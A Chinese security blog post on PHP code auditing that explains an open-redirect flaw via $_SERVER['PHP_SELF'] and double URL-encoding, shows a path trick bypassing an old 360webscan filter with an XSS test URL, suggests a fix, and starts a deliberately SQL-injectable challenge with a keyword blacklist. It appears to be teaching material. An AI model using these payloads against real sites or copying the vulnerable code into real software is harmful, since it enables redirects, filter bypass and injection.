<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Day 15 - Sleigh Ride题目叫做滑雪橇，代码如下： 1234567891011121314151617181920212223class Redirect&#123;    private $websiteHost&#x3D;&#x27;www.example.com&#x27;;    private function setHeaders($url)&#123;        $url&#x3D;">
<meta property="og:type" content="article">
<meta property="og:title" content="【代码审计】PHP代码审计5">
<meta property="og:url" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="Day 15 - Sleigh Ride题目叫做滑雪橇，代码如下： 1234567891011121314151617181920212223class Redirect&#123;    private $websiteHost&#x3D;&#x27;www.example.com&#x27;;    private function setHeaders($url)&#123;        $url&#x3D;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-1.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-2.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-3.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-4.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-5.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-6.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-7.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-8.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-9.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-10.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-11.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-12.png">
<meta property="og:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-13.png">
<meta property="article:published_time" content="2024-10-16T07:34:01.000Z">
<meta property="article:modified_time" content="2024-10-16T08:49:02.394Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【代码审计】PHP代码审计5</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/10/16/PaperReading/javacode/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/16/algorithm/string/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&text=【代码审计】PHP代码审计5"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&is_video=false&description=【代码审计】PHP代码审计5"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计5&body=Check out this article: https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&title=【代码审计】PHP代码审计5"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&name=【代码审计】PHP代码审计5&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/16/WebSecurity/codeaudit/phpaudit5/&t=【代码审计】PHP代码审计5"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-15-Sleigh-Ride"><span class="toc-number">1.</span> <span class="toc-text">Day 15 - Sleigh Ride</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-16-Poem"><span class="toc-number">2.</span> <span class="toc-text">Day 16 - Poem</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">实例分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">3.1.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">3.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-17-Turkey-Baster"><span class="toc-number">4.</span> <span class="toc-text">Day 17 - Turkey Baster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-2"><span class="toc-number">4.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-number">4.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【代码审计】PHP代码审计5
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-16T07:34:01.000Z" class="dt-published" itemprop="datePublished">2024-10-16</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web-Security/">Web Security</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><p>题目叫做滑雪橇，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$websiteHost</span>=<span class="string">&#x27;www.example.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span>= <span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:<span class="subst">$url</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span>(<span class="params"><span class="variable">$params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$parts</span>= <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">        <span class="variable">$baseFile</span>= <span class="title function_ invoke__">end</span>(<span class="variable">$parts</span>);</span><br><span class="line">        <span class="variable">$url</span>= <span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">            <span class="string">&quot;%s?%s&quot;</span>,</span><br><span class="line">            <span class="variable">$baseFile</span>,</span><br><span class="line">            <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setHeaders</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>])&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">Redirect</span>())-&gt;<span class="title function_ invoke__">startRedirect</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;params&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞解析</strong> ：</p>
<p>这一关主要考察的是 <strong>$_SERVER[‘PHP_SELF’]</strong> 引发的一个任意网址跳转漏洞</p>
<p>首先，分析一下程序的运行</p>
<ul>
<li>如果有 <strong>$_GET[‘redirect’]</strong> 参数，那么就 New 一个 <strong>Redirect</strong> 对象，同时调用 <strong>Redirect</strong> 类的 <strong>startRedirect</strong> 方法</li>
<li><strong>startRedirect</strong> 函数接受一个 <strong>GET</strong> 类型的 <strong>params</strong> 参数，然后在 <strong>explode()</strong> 函数中，将 <strong>$_SERVER[‘PHP_SELF’]</strong> 得到的值，以 <strong>&#x2F;</strong> 分割成一个 <strong>$parts</strong> 数组。</li>
<li><strong>$baseFile</strong> 的值为 <strong>$parts</strong> 数组的最后一个值</li>
<li><strong>$url</strong> 的值为 <strong>$baseFile?http_build_query($params)</strong> ，其中的 <strong>http_build_query()</strong> 函数就是一个将参数进行URL编码的一个操作，比如 <strong>$params&#x3D;’test&#x3D;123’</strong></li>
<li>然后调用 <strong>setHeaders</strong> 函数，首先解码 <strong>$url</strong> 参数，然后 <strong>header()</strong> 函数直接跳转 <strong>$url</strong></li>
</ul>
<p><strong>$_SERVER[‘PHP’]</strong> 存在的问题：</p>
<p>初看这个程序没什么问题，但是PHP自带的**$_SERVER[‘PHP_SELF’]** 参数是可以控制的。其中 <strong>PHP_SELF</strong> 指当前的页面绝对地址，比如我们的网站：<strong><a target="_blank" rel="noopener" href="http://www.test.com/redict/index.php">http://www.test.com/redict/index.php</a></strong>，那么<strong>PHP_SELF</strong> 就是 <strong>&#x2F;redict&#x2F;index.php</strong> 。但有个小问题很多人没有注意到，当<strong>URL</strong>是<strong>PATH_INFO</strong>的时候，比如：<strong><a target="_blank" rel="noopener" href="http://www.test.com/redict/index.php/admin">http://www.test.com/redict/index.php/admin</a></strong>，那么<strong>PHP_SELF</strong>就是**&#x2F;redict&#x2F;index.php&#x2F;admin** 也就是说，其实 <strong>PHP_SELF</strong> 有一部分是我们可以控制的。</p>
<p>双编码问题：</p>
<p>URL本来是被浏览器编码过一次，服务器接收到来自浏览器URL请求的时候，会将URL解码一次，由于在程序中我们看到有 <strong>urldecode()</strong> 函数存在，它会再次解码一次URL，此时双编码URL就可以利用，用于绕过某些关键词检测。比如将 <strong>&#x2F;</strong> 编码为： <strong>%252f</strong> </p>
<p>漏洞利用：</p>
<p>比如我们要跳转到我的博客：<strong>blog.dyboy.cn</strong> ，那么就可以构造 <strong>Payload</strong> ：<strong><a target="_blank" rel="noopener" href="http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&params=test123">http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123</a></strong> ，访问即可重定向跳转到 <strong><a target="_blank" rel="noopener" href="http://blog.dyboy.cn/">http://blog.dyboy.cn</a></strong> 网址。如下图所示，发生了 <strong>302</strong> 跳转：</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image.png"></p>
<h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>其实关于这个漏洞的利用，是有很多src案例的。但是都是黑盒测试，不是很清楚后台的代码怎么设计的，这里可以提及到一个关于 <strong>360webscan</strong> 的防护脚本一个历史漏洞，正是使用了 <strong>$_SERVER[‘PHP_SELF’]</strong> 这个变量，导致可以绕过360webscan防护脚本的防护，脚本的防护效果失效，现在此防护脚本更新了。</p>
<p>最新版下载地址： <a target="_blank" rel="noopener" href="http://webscan.360.cn/protect/down?domain=www.test.com">http://webscan.360.cn/protect/down?domain=www.test.com</a></p>
<p>旧版本下载地址：<a target="_blank" rel="noopener" href="https://www.lanzous.com/i1qj0qh">https://www.lanzous.com/i1qj0qh</a></p>
<p>其结构为：</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-1.png"></p>
<p>因为这只是一个防护的辅助脚本，任何的程序都可以安装使用，这里就以 <strong>Emlog5.3.1</strong> 博客程序为例子，程序不重要，这个脚本可以安装接入到任何的程序中。</p>
<p>安装的方法：解压得到 <strong>360safe</strong> 文件夹，之后上传到我们的网站根目录中，同时在任意的全局文件中加入如下代码即可安装成功：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/360safe/360webscan.php&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/360safe/360webscan.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在按照上述安装方法安装后，测试访问： <code>http://www.test.com/index.php?test=&lt;script&gt;alert(1)&lt;/script&gt;</code> ，XSS拦截显示：</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-2.png"></p>
<p>比如GET传递的数据存在SQL注入恶意字符都会被拦截，虽然本脚本的正则过滤规则很好了，但是通过这一个 <strong>$_SERVER[‘PHP_SELF’]</strong> ，可以通过白名单规则绕过攻击防护。</p>
<p>在存在绕过漏洞的360webscan历史版本中，如下图 <strong>第194-219行</strong> 的的代码（拦截目录白名单检测）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">webscan_white</span>(<span class="params"><span class="variable">$webscan_white_name</span>, <span class="variable">$webscan_white_url</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url_path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line">    <span class="variable">$url_var</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$webscan_white_url</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span> . <span class="variable">$webscan_white_name</span> . <span class="string">&quot;/is&quot;</span>, <span class="variable">$url_path</span>) == <span class="number">1</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$webscan_white_name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 拦截目录白名单</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">empty</span>(<span class="variable">$url_var</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$url_var</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$url_path</span>, <span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$url_var</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上图的 <strong>第5行</strong> ，我们看到 <strong>$url_path</strong> 的值是直接取的 <strong>$_server[‘PHP_SELF’]</strong> 的值，同时没有做任何的验证或过滤。那么我们只要在请求的URL（提交的参数中）存在白名单目录，那么就可以绕过安全检测。</p>
<p>因为在 <strong>webscan_cache.php</strong> 中的默认的白名单目录存在 <strong>admin</strong> 。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户唯一key</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_U_KEY&#x27;</span>, <span class="string">&#x27;6809abbda8d53816f11500b52637e8db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据回调统计地址</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_API_LOG&#x27;</span>, <span class="string">&#x27;http://safe.webscan.360.cn/papi/log/?key=&#x27;</span> . WEBSCAN_U_KEY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 版本更新地址</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WEBSCAN_UPDATE_FILE&#x27;</span>, <span class="string">&#x27;http://safe.webscan.360.cn/papi/update/?key=&#x27;</span> . WEBSCAN_U_KEY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拦截开关(1为开启，@关闭)</span></span><br><span class="line"><span class="variable">$webscan_switch</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提交方式拦截(1开启拦截，@关闭拦截，post,get,cookie,referre选择需要拦截的方式)</span></span><br><span class="line"><span class="variable">$webscan_post</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_get</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_cookie</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$webscan_referre</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后台白名单,后台操作将不会拦截,添加&quot;|&quot;隔开白名单目录下面默认是网址带admin/dede/放行</span></span><br><span class="line"><span class="variable">$webscan_white_directory</span> = <span class="string">&#x27;admin|\/dede\/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// url白名单，可以自定义添加url白名单，默认是对phpcms的后台url放行</span></span><br><span class="line"><span class="variable">$webscan_white_url</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;index.php&#x27;</span> =&gt; <span class="string">&#x27;m=admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;post.php&#x27;</span> =&gt; <span class="string">&#x27;job=postnew&amp;step=post&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edit_space_info.php&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们访问：<strong><a target="_blank" rel="noopener" href="http://www.test.com/index.php/admin?test=%3Cscript%3Ealert(1)%3C/script%3E">http://www.test.com/index.php/admin?test=%3Cscript%3Ealert(1)%3C/script%3E</a></strong></p>
<p>此处虽然返回的状态码是 <strong>404</strong> ，但是，我们发现已经不再拦截了，如果再配合某些CMS或者PHP系统的伪静态特殊性，那么就可以成功的绕过防护。</p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>本次审计的其实不是漏洞，主要是一个 <strong>$_SERVER[‘PHP_SELF’]</strong> 的问题，再遇上某系伪静态规则配合下，就会导致各种由此形成的各种漏洞。因此，这里推荐使用 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 代替即可，同时，我们可以看到在最新的360webscan中已经更新了这个问题，并且就是使用 <strong>$_SERVER[‘SCRIPT_NAME’]</strong> 。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$black_list</span> = <span class="string">&quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&#x27;|&quot;</span>;</span><br><span class="line"><span class="variable">$black_list</span> .= <span class="string">&quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$black_list</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;:P&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$black_list</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;:P&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select user from users where user=&#x27;<span class="subst">$_GET</span>[user]&#x27; and pwd=&#x27;<span class="subst">$_GET</span>[pwd]&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span 